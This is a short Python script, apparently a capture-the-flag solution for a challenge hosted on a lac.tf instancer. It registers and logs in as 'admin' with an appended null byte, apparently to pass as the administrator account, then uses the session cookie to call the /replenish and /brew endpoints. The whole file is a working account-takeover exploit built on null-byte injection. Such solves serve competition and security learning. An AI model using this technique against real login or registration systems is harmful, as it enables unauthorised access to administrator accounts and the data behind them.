import requests

HOST = "https://arclbroth-0945u.instancer.lac.tf"

res = requests.post(
    f"{HOST}/register", json={"username": "admin\00", "password": "admin"}
)
print(res.text)

res = requests.post(f"{HOST}/login", json={"username": "admin\00", "password": "admin"})
print(res.text)
print(res.headers)
cookie = res.cookies["session"]

res = requests.post(f"{HOST}/replenish", cookies={"session": cookie})
print(res.text)

res = requests.post(f"{HOST}/brew", cookies={"session": cookie})
print(res.text)
